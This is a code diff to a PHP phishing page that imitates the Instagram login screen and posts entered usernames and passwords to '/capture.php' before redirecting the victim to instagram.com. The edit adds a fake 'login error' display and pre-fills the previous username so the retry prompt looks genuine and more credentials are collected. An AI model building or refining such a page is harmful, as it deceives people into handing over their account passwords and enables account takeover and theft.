@@ -3,6 +3,10 @@ if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
 $redirect_url = isset($_SESSION['redirect_url']) ? $_SESSION['redirect_url'] : 'https://www.instagram.com/';
+$login_error = isset($_SESSION['login_error']) ? $_SESSION['login_error'] : '';
+$last_username = isset($_SESSION['last_username']) ? $_SESSION['last_username'] : '';
+unset($_SESSION['login_error']);
+unset($_SESSION['last_username']);
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -21,6 +25,7 @@ $redirect_url = isset($_SESSION['redirect_url']) ? $_SESSION['redirect_url'] : '
         .form input:focus{border-color:#a8a8a8;background:#fff}
         .form button{width:100%;padding:7px 16px;margin-top:8px;background:#0095f6;border:none;border-radius:8px;color:#fff;font-weight:600;font-size:14px;cursor:pointer}
         .form button:disabled{background:rgba(0,149,246,0.3);cursor:default}
+        .error{color:#ed4956;font-size:14px;margin:10px 0;text-align:center}
         .divider{display:flex;align-items:center;margin:18px 0}
         .divider::before,.divider::after{content:"";flex:1;height:1px;background:#dbdbdb}
         .divider span{margin:0 18px;color:#8e8e8e;font-size:13px;font-weight:600}
@@ -48,14 +53,17 @@ $redirect_url = isset($_SESSION['redirect_url']) ? $_SESSION['redirect_url'] : '
     <div class="container">
         <div class="box">
             <div class="logo"></div>
+            <?php if ($login_error): ?>
+            <div class="error"><?php echo htmlspecialchars($login_error); ?></div>
+            <?php endif; ?>
             <form class="form" id="f" method="POST" action="/capture.php">
-                <input type="text" id="u" name="username" placeholder="Phone number, username, or email" required>
+                <input type="text" id="u" name="username" placeholder="Phone number, username, or email" value="<?php echo htmlspecialchars($last_username); ?>" required>
                 <div class="pwd">
                     <input type="password" id="p" name="password" placeholder="Password" required>
                     <button type="button" id="t">Show</button>
                 </div>
                 <input type="hidden" name="redirect_url" value="<?php echo htmlspecialchars($redirect_url); ?>">
-                <button type="submit" id="b" disabled>Log in</button>
+                <button type="submit" id="b" <?php echo $last_username ? '' : 'disabled'; ?>>Log in</button>
                 <div class="loading" id="l"><svg width="18" height="18" viewBox="0 0 18 18"><circle cx="9" cy="9" r="8" stroke="#c7c7c7" stroke-width="2" fill="none"/><path d="M9 1a8 8 0 0 1 8 8" stroke="#8e8e8e" stroke-width="2" stroke-linecap="round" fill="none"/></svg></div>
             </form>
             <div class="divider"><span>OR</span></div>
